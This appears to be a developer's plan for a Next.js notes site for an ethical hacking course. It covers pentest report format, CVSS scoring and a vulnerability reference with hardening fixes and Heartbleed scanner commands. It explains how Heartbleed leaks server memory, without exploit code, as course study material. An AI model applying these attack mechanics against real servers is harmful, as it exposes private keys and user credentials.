- Report structure: Executive Summary → Engagement Scope & Methodology → Technical Background → Detailed Findings → Attack Narrative → Remediation Roadmap → Appendices
- Risk rating systems: CVSS v3.1 (Common Vulnerability Scoring System)
  - CVSS metrics: Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability Impact
  - Score ranges: 0.0 = None, 0.1-3.9 = Low, 4.0-6.9 = Medium, 7.0-8.9 = High, 9.0-10.0 = Critical
  - Context can elevate severity beyond base score (e.g., Heartbleed 7.5 HIGH elevated to Critical in practice)
- Finding format: Finding ID, Severity, CVE, CVSS Score, Affected Host/Port, Service, Authentication Required, Remediation Effort; then Description, Discovery steps, Proof of Concept, Risk Analysis, Remediation Guidance, References
- Remediation guidance format: prioritise by severity with timelines (Critical ≤24hrs, High ≤7 days, Medium ≤30 days, Low ≤90 days)
- Attack narrative: step-by-step story of what an attacker could do from initial recon to full compromise — makes technical impact real to non-technical stakeholders
- Key pentest report principles: evidence-based claims, reproducible steps, plain language for executive sections, technical detail for engineer sections
- Patch management SLA definition: Critical ≤24hrs, High ≤7 days, Medium ≤30 days, Low ≤90 days

### Content: `lib/topics/vuln-reference.tsx`

Key topics to cover (CVEs and security issues from the course):
- CVE-2014-0160 (Heartbleed):
  - OpenSSL versions 1.0.1 through 1.0.1f (and 1.0.2-beta)
  - TLS/DTLS Heartbeat Extension (RFC 6520) — keep-alive signalling
  - Bug: no bounds check on payload_length field in Heartbeat request
  - Attack: send small (or zero-byte) payload but declare payload_length up to 65535 → server copies up to 64KB of heap memory into response
  - Data exposed: private key material (RSA/DSA/ECDSA), session tokens/cookies, plaintext credentials, application data, memory layout (useful for ASLR bypass)
  - Key characteristic: NO server-side log entries — cannot determine how many times exploited
  - CVSS 3.1: 7.5 (HIGH) — real-world impact much higher due to private key recovery possibility
  - Fix: upgrade OpenSSL to ≥1.0.1g (or 3.x). Not affected: OpenSSL 0.9.8 (no Heartbeat), ≥1.0.1g (patched)
  - Post-compromise: reissue TLS certs, rotate all session tokens, rotate all secrets in memory, GDPR breach assessment
  - Detection: nmap --script ssl-heartbleed, testssl.sh --heartbleed
- TLS 1.0/1.1 (YORK-002):
  - Deprecated by RFC 8996 (March 2021)
  - TLS 1.0 vulnerable to BEAST attack (CVE-2011-3389)
  - TLS 1.1 no AEAD cipher suite support, uses MD5/SHA-1 PRF
  - Modern browsers no longer support TLS 1.0/1.1
  - Fix (Apache): SSLProtocol -all +TLSv1.2 +TLSv1.3
- HTTP Security Headers (YORK-003):
  - Content-Security-Policy: absent → XSS, data injection risk
  - X-Frame-Options: absent → clickjacking
  - X-Content-Type-Options: absent → MIME-type confusion attacks
  - Referrer-Policy: absent → information leakage via Referer header
  - Permissions-Policy: absent → browser feature abuse
  - Apache fix: Header always set X-Content-Type-Options "nosniff" etc.
- Verbose Server Banner (YORK-004):
  - Server: and X-Powered-By: headers disclose exact software versions
  - Reduces reconnaissance effort for attacker
  - Apache fix: ServerTokens Prod; ServerSignature Off; PHP: expose_php = Off
- HSTS Not Enforced on Subdomains (YORK-005):
  - HSTS header present but missing includeSubDomains and preload directives
  - Subdomains vulnerable to SSL-stripping
  - Fix: max-age=63072000; includeSubDomains; preload; submit to HSTS preload list

**Step 1: Create all topic files using the content above, rendering as rich React components**

Each file exports a default function component using `<Callout>`, `<Table>`, `<Term>`, `<pre>` blocks, and standard HTML elements styled by Tailwind prose.

**Step 2: Update `lib/notes-data.ts` with correct slugs and search-indexable text for all topics**

**Step 3: Commit**

```bash
git add lib/topics/
git commit -m "feat: add comprehensive EHAC notes content"
```

---

## Task 11: Final Polish & Build Check

**Files:**
- Create: `app/not-found.tsx`
- Create: `.env.example`

**Step 1: Create `app/not-found.tsx`**

```typescript
import Link from "next/link";
export default function NotFound() {
  return (
    <div className="min-h-screen flex items-center justify-center">
      <div className="text-center">
        <h1 className="text-4xl font-bold mb-2">404</h1>
        <p className="text-gray-500 mb-4">Page not found</p>
        <Link href="/" className="text-blue-600 hover:underline">← Back to notes</Link>
      </div>
    </div>
  );
}
```

**Step 2: Create `.env.example`**

```
NEXT_PUBLIC_NOTES_PASSWORD=your_password_here
```

**Step 3: Run build check**

```bash
cd /home/tom/projects/notes
npm run build
```

Expected: successful build with no TypeScript errors

**Step 4: Final commit**

```bash
git add .
git commit -m "feat: complete EHAC notes site"
```

---

## Deployment Notes

This is a separate Vercel project. After building locally:
1. Run `vercel` in `/home/tom/projects/notes` to create a new Vercel project
2. Set `NEXT_PUBLIC_NOTES_PASSWORD` in Vercel environment variables
3. Add `notes.comr.ie` as a custom domain in Vercel dashboard
4. Point the `notes` subdomain CNAME to `cname.vercel-dns.com` in DNS settings
